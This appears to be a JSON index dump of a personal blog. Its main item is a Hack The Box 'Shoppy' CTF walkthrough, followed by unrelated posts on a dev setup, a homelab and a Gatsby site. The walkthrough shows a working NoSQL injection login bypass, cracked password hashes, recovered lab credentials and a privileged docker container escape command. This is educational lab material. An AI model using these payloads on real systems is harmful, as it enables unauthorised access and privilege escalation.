[{"categories":null,"content":"Intro I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review \u0026 learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again. So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired. ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:1:0","tags":["pentesting","infosec","penetration testing","security","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Enumeration As always, we connect to the HTB VPN using OpenVPN, and join the machine to be given an IP address. All work is done from a Parrot OS VirtualBox VM. Firstly, a quick nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.180 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-25 15:38 AEDT Nmap scan report for 10.10.11.180 Host is up (0.020s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect res Browsing to http://10.10.11.180 redirects to http://shoppy.htb, so I added this to my /etc/hosts file. Browsing to http://shoppy.htb gives a landing page with a countdown: Gobuster output using common.txt wordlist: $gobuster dir -u \"http://shoppy.htb\" -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/12/25 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 302) [Size: 28] [--\u003e /login] /Admin (Status: 302) [Size: 28] [--\u003e /login] /ADMIN (Status: 302) [Size: 28] [--\u003e /login] /assets (Status: 301) [Size: 179] [--\u003e /./] /css (Status: 301) [Size: 173] [--\u003e /css/] /exports (Status: 301) [Size: 181] [--\u003e /exports/] /favicon.ico (Status: 200) [Size: 213054] /fonts (Status: 301) [Size: 177] [--\u003e /fonts/] /images (Status: 301) [Size: 179] [--\u003e /images/] /js (Status: 301) [Size: 171] [--\u003e /js/] /login (Status: 200) [Size: 1074] /Login (Status: 200) [Size: 1074] =============================================================== 2022/12/25 15:53:49 Finished =============================================================== ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:2:0","tags":["pentesting","infosec","penetration testing","security","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Foothold I attempted to run sqlmap against http://shoppy.htb/login, but kept getting timeout errors: [17:43:29] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s) [17:44:59] [CRITICAL] connection timed out to the target URL or proxy I next ran sqlmap through burp suite and checked the intercepted traffic: $sqlmap -u \"http://shoppy.htb/login\" --data \"username=*\u0026password=*\" --proxy \"http://127.0.0.1:8080\" --headers=\"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0\" At this point, it appeared to my novice eyes as though a WAF (web app firewall) was blocking SQL injection attempts (maybe?) as ’normal’ login attempts result in a 302 redirect, not a 504 gateway timeout. I did notice the timeouts only occur when injecting into user, not password – so I suspected that this was the exploitable input field.. But the above was a modified intercepted request from Firefox with a legitimate user agent string along with other headers – so perhaps not a WAF and something else?.. After a little while of unsuccessful SQL Injection both with SQLMap and y, I back tracked a little to look at other injection techniques and started reading NoSQL injection - HackTricks I then tried the following to see if I was dealing with some document database that could be injected into: POST /login HTTP/1.1 Content-Length: 42 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Host: shoppy.htb Accept: */* Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=utf-8 Connection: close username=admin' || 1==1%00\u0026password=foobar The initial example of username=admin' || 1==1//\u0026password=foobar gave a 504, but the above worked and gave the following response!: HTTP/1.1 302 Found Server: nginx/1.23.1 Date: Sun, 25 Dec 2022 07:38:44 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 28 Connection: close Location: /admin Vary: Accept Set-Cookie: connect.sid=s%3Aw1vzR-3zSPV98eF-hiBqdfT8SFB4-Omf.s03gQG0EK%2F4m8xUI8cB0EP5xTTqOk7SEFv9W16yAxJY; Path=/; HttpOnly Found. Redirecting to /admin After the redirect I ended up at /admin: The page looks fairly static, apart from the Search for users button which does a GET http://shoppy.htb/admin/search-users . If i inject into this with ' || 1==1// , I get two users in the download link that shows - http://shoppy.htb/exports/export-search.json: [ {\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"}, {\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"} ] After running hashcat against a file containing both MD5 sums: $hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... $hashcat --show hashes.txt 6ebcea65320589ca4f2f1ce039975995:remembermethisway I was unable to SSH into the machine with josh/remembermethisway, and here I got a little stuck.. I reviewed the server, looking for other clues but couldn’t find much. I decided to scan all ports with nmap -sC -sV -oN nmap/all -p- 10.10.11.180, and saw 9093 was an open HTTP server Searching around, it looked like Prometheus go metrics – however there was nothing that appeared particularly useful. I’ll admit that here I ‘cheated’ and checked the HTB discussion thread for this box – and saw people hinting at another subdomain. I noticed when searching for some of the terms in the above prometheus alerts, particularly around playbooks, I saw reference to mattermost: GitHub - mattermost/mattermost-plugin-playbooks: Mattermost Playbooks enable reliable and repeatable processes for your teams using checklists, automation, and retrospectives. With this in mind, I ran a vhost scan in gobuster using SecList DNS lists.. $gobuster vhost -u \"http://shoppy.htb\" -w ~/SecLists/Discovery/DNS/*.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:3:0","tags":["pentesting","infosec","penetration testing","security","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Privilege Escalation Checking sudo access, I can run /home/deploy/password-manager, which was mentioned somewhere in the mattermost chat: jaeger@shoppy:~$ sudo -l Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager Running a `strings /home/deploy/password-manager shows a credentials text file, which I cannot cat myself directly: jaeger@shoppy:~$ strings /home/deploy/password-manager \u003c.. snip ..\u003e Welcome to Josh password manager! Please enter your master password: Access granted! Here is creds ! cat /home/deploy/creds.txt Access denied! This incident will be reported ! jaeger@shoppy:~$ cat /home/deploy/creds.txt cat: /home/deploy/creds.txt: Permission denied jaeger@shoppy:~$ ls -la /home/deploy/creds.txt -rw------- 1 deploy deploy 56 Jul 22 13:15 /home/deploy/creds.txt So I am able to run the password manager, but need the master pass, or to somehow bypass this.. jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: remembermethisway Access denied! This incident will be reported ! In /home/deploy, there is a password-manager.cpp which we cannot read. This is in line with the mattermost chat where Josh mentions creating a password manager in C++. We have access to the compiled binary, so let’s take a copy to play with locally: scp jaeger@shoppy.htb:/home/deploy/password-manager . jaeger@shoppy.htb's password: password-manager 100% 18KB 454.9KB/s 00:00 Taking a look at the decompiled main function in Ghidra, it looks like we call the += operator in order to concatenate and build a string stored in variable local_68, which we compare to local_48 (which is std::cin – i.e. the standard input stream). So, the app expects “Sample” – let’s try that: jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! I can now ssh into the deploy account, and confirm the password manager logic above based on the c++ source: #include \u003ciostream\u003e #include \u003cstring\u003e int main() { std::cout \u003c\u003c \"Welcome to Josh password manager!\" \u003c\u003c std::endl; std::cout \u003c\u003c \"Please enter your master password: \"; std::string password; std::cin \u003e\u003e password; std::string master_password = \"\"; master_password += \"S\"; master_password += \"a\"; master_password += \"m\"; master_password += \"p\"; master_password += \"l\"; master_password += \"e\"; if (password.compare(master_password) == 0) { std::cout \u003c\u003c \"Access granted! Here is creds !\" \u003c\u003c std::endl; system(\"cat /home/deploy/creds.txt\"); return 0; } else { std::cout \u003c\u003c \"Access denied! This incident will be reported !\" \u003c\u003c std::endl; return 1; } } I tried clobbering cat in $PATH to privesc, when logged in as jaeger and entering the password – but remembered sudoers is set so you cannot preserve the environment, and /home/deploy/password-manager only runs as the deploy user anyway. I then remembered in matter most chat, there was mention of the deploy account being used and it would be deploying via docker.. So, let’s see if we can access docker, if there are any images (HTB boxes do not have internet access, so cannot pull down container images from dockerhub), and if we can run a privileged container to try get root on the host. Docker based privilege escalation is new to me, and not something I have experience with – but I was able to consult the always excellent HackTricks - Docker Breakout / Privilege Escalation - HackTricks Luckily, we have access to an alpine image we can use to spin up a privileged container. Inside the container we run nsenter: $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest d7d3d98c851f 5 months ago 5.53MB $ docker run -it --rm --pid=host --privileged alpine /bin/sh ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:4:0","tags":["pentesting","infosec","penetration testing","security","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"About emdwyer","date":"2022-05-23","objectID":"/about/","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":"Interests Development (Ruby, React, Javascript) Infosec / CyberSecurity - Penetration Testing, CTF challenges Fitness - Cycling, Running, Strength Training Philosophy Qualifications B. Engineering (Software) PRINCE2 Foundation ITIL Foundation ","date":"2022-05-23","objectID":"/about/:0:0","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":" My current setup The last several months have seen me moving around.. A lot (thanks COVID).. But after hunting around for furniture due to a shortage of standing desks, I’ve finalised my setup – and thank god. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:0:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Setup It’s been great to revive my Ultrawide and laptop in a fairly minimalist setup. This is my primary dev machine which, if you see my GitHub, has caused no end of issues with running Linux (#YearOfTheLinuxDesktop) in the 2 years I’ve had it. My setup from the photo above: HP Zbook x360 G5 2-in-1 laptop running Arch. Screenfetch shows my config: LG 34UC99-W monitor Drop Alt keyboard (Halo Clears for now) Logitech MX Master 2S Mouse A beautiful Marble Queen Pothos for good measure My development is all local, baremetal (for now) with vscode and browser usually tiled on the Ultrawide, and an extra terminal on my laptop display for running tests or other things requiring more screen real estate outside of vscode’s terminal. I’ll most definitely elaborate on my setup more in a future post. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:1:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Studies My focus since moving to Melbourne has been a combination of React, Node, Express, GraphQL and MongoDB - a fairly big change from the last several years I’ve spent on mostly back end Ruby development, surrounding test automation frameworks and CI/CD. Let’s keep in mind I’ve been moving to full stack and not looked at anything web since my degree an embarassing number of years ago. Back then, it was raw HTML, CSS and a bit of jQuery.. And maybe some Bootstrap. My memory is hazy - it was a while ago! Let’s just say I’ve had a lot of catching up to do - UI frameworks, CSS-in-JS frameworks, bundlers, various other tooling.. So, how has my journey looked? FreeCodeCamp FullStackOpen Projects! I initially completed all the FreeCodeCamp certificates, but became a little bored of coding in a browser, and was after something a little more comprehensive and ‘real world’. FullStackOpen filled the gap really nicely. While FreeCodeCamp focuses on JavaScript basics, FullStackOpen was a great way to quickly come up to speed with the JavaScript ecosystem, and learn how to set up React projects, some WebPack, Node \u0026 Express backends and some GraphQL. Oh, and writing unit tests for React components (react-testing-library), and cypress for e2e integration tests? Excellent. Redux? Great! Linting? Awesome! I felt the jumping between projects throughout the course contents and exercises to be a little jarring and confusing at times (and not so obvious), but being able to create a full stack application from end to end, and mocking out certain components yet to be developed was a great way to get up to speed and provided a structured approach from both a bird’s-eye and on-the-ground-running view – a perfect balance. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:2:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Projects I’ve now started up a full stack project - exertion - yet another fitness tracker. I’m also seemingly forever revising this Gatsby site, which I started from scratch. Reinventing the wheel is obviously not the best of ideas, however it’s been a great look into using a static site generator, writing React components, creating my own front end from scatch (this is where I struggle most) and a little GraphQL. A part of me feels using a Gatsby starter would have been wise, but it has been enjoyable and educational coding it all from scratch. The caveat, of course, is that I still have much to do - particularly applying UI design principles around alignment, whitespace, typography etc - in order to add further polish to my site. For me, this is not only continuing to evolve my CSS skills, but also bridging the gap between being identifying if a site’s UI design is aesthetically pleasing or not and understanding why and how it looks great, then subsequently what styling is required to achieve this. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:3:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Next Steps My next steps are to continue my app, and look at Next.js. The tooling, particularly WebPack, has definitely caused a little friction and not provided the best developer experience. I’ve definitely had some fun with WebPack, setting up Babel, getting Jest to work with Babel, etc - so trying out Next.js and some of its features such as code splitting, server side rendering etc looks like a great path forward. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:4:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":" Cable management - please don't do this. Ever. After relocating around Melbourne multiple times during 2020 (pandemic - long story) and finally settling into my own place with FTTC, I decided it was time to revive the home lab. Previously back in Newcastle, my homelab comprised of: HP MicroServer Gen 8 (running Proxmox) HP ML10v2 (a playground/sandpit host of sorts - jumping between Hyper-V and Proxmox) HP PS1810-8G managed switch Some really crappy, locked all-in-one router device thing from my ISP (I cannot remember the model) After FTTC NBN was finally connected - a drama in itself (another long story) - and after deliberating on Point 4, I decided it made sense to opt for something a little more prosumer grade. I’ve had a longer term interest in homelab tinkering and InfoSec, on top of Development and DevOps things, and simply wanted to Do Things Right™ My ideal setup is the ability to easily create multiple VLANs (which I’ll cover in a future blog), and multiple SSIDs, tagging each with a specific VLAN. This way, I can keep my untrusted IoT devices on their own VLAN with internet access only, and trusted devices (phones, laptops) on a separate VLAN with more freedom. My existing HP MicroServer and ML10V2 run VLAN trunks across the HP switch, and I can readily assign virtual machines to different VLAN IDs, so doing the same for my SSIDs is ideal – again, I’ll cover specifics of my setup later and why I wanted this flexibility. Enter the first upgrade - The Tin Can - otherwise known as the Ubiquiti FlexHD: I originally looked at the UniFi Dream Machine, but the IDS/IPS capabilities seemed somewhat limited, as did the lack of other advanced features. The Unifi AP variants were also considered, but the form factor seemed more suited to mounting on a wall or roof. Besides, who could turn down a wireless access point that resembles a coke can? Next up, after deciding on pfSense as a router/firewall, mostly to play around with IDS/IPS (Suricata) and other packages, I started looking at appliances. The pfSense reddit seems to indicate Protectli and some other pfSense appliances were actually Qotom, Yanling or Minisys mini PCs as found on AliExpress. A quick search on AliExpress for ‘pfsense’ shows many upon many clones of clones of clones of mini PCs with anywhere from 2-6 Intel NICs. I eventually settled on the Topton, a passively cooled mini PC perfectly suited as a router/firewall: Specs: Intel Core i5 8265U (so includes AES-NI) 6 Intel NICs 128 GB SSD 16GB RAM It’s total overkill, but great value for what I paid (around $540 AUD including shipping) for the specs. At this point, I had decided I would virtualise pfSense and pass through a NIC bridged to the NBN FTTC box, given I needed to run the Unifi Network Controller in a separate virtul machine and wasn’t keen on cloud hosted. I think this was the point where I had decided on 16GB RAM, the maximum available at purchase, and 128 GB SSD – with a spare SATA bay for extra storage if required. I would be running this devices as an edge router/firewall, Unifi Network Controller for managing my FlexHD, and with spare resources for any other network appliances I decide on.. In the next part, I’ll cover my basic strategy around configuration, network segmentation, etc. ","date":"2021-03-24","objectID":"/2021-03-24-rebuilding-homelab/:0:0","tags":["homelab","infosec"],"title":"Rebuilding Homelab - Part 1","uri":"/2021-03-24-rebuilding-homelab/"},{"categories":null,"content":" Here it is in its (relative) infancy! Given the current pandemic unfolding, I decided to complete the following on freeCodeCamp to try and increase my productivity (and employment prospects!) while our city has been in and out of lock down: Responsive Web Design Certification JavaScript Algorithms and Data Structures Certification Front End Libraries Certification What this means is, I decided to redo my site using Gatsby, as it seemed to be the static site generator most aligned with React and JavaScript generally, and I was a little curious about GraphQL. Jekyll was fun for a brief moment, but Gatsby seems more aligned with the skills I’m learning and has a fairly comprehensive plugin system. After initially working my way through the tutorials, I did play with some starter Gatsby projects - and it was at this point I decided to reinvent the wheel a little. I’m normally against this (as any developer should be, to a degree), but given my intention to hopefully work in web development at some point, and not having looked at any web development since my university days, I thought developing my own site starting from a blank slate would be a great way to practice and apply some newly learned skills. As such, this is the first project I’ve applied HTML5, CSS3, JS and React to – and any kind of front end development, particularly responsive design. While I’ve worked several technical roles since graduating, including development, none have focused on web development. What does this mean? Strap in for a bumpy ride – plenty of tweaks and improvements to this site, and likely some further technical posts for things I learn and discover along the way that may help others. Oh, and there will be plenty of opportunity for other posts too. I’m currently somewhat obsessed with Productivity (think Getting Things Done) and trying to use technology to its potential, along with develop good habits and establish routines to try and achieve more (much more). I’m sure there will be many topics I can cover in this space. ","date":"2020-07-13","objectID":"/2020-07-13-building-a-site-in-gatsby/:0:0","tags":["development"],"title":"Building a Site in Gatsby","uri":"/2020-07-13-building-a-site-in-gatsby/"},{"categories":null,"content":"Well, here it is. I thought I should attempt to start some platform to rant and share things on, tech related and whatnot. So - here’s my first blog, which I’ll use to share anything related to Linux, development, maybe some fitness and other miscellaneous subjects. Bear with me, as this site also will also serve as a starting point for (re)learning some web development. For the past few years, I’ve largely concentrated on Ruby, C#, some BASH and other scripting – so I’m picking up web again and I’m very rusty! Along the way, I’m hoping to document anything interesting I find. There have been many moments previously where, beyond a git repository, I’ve thought ‘I should probably take note of this somewhere, and share with others’. So, now I have no excuses! A static site generator seemed like my best option, as it’s trivial to register a domain, and link back to Github Pages. I decided to go with Jekyll for the simple reason that it seems simple and straightforward to start with, and I’m already familiar with Ruby. However, I am starting to (re)learn HTML, CSS, Javascript and hoping to pick up Node and React. Eventually, I’d like to try out another static site generator, such as Gatesby. As you have undoubtedly noticed, front end development is not my forte. My background has mostly been backend (some very minor front end web, and Windows Forms applications), so I will be attempting to place a degree of emphasis on this over the coming months, and learning to make things pretty. Obviously I have a long way to go! ","date":"2020-03-30","objectID":"/2020-03-20-first/:0:0","tags":["development"],"title":"First post","uri":"/2020-03-20-first/"}]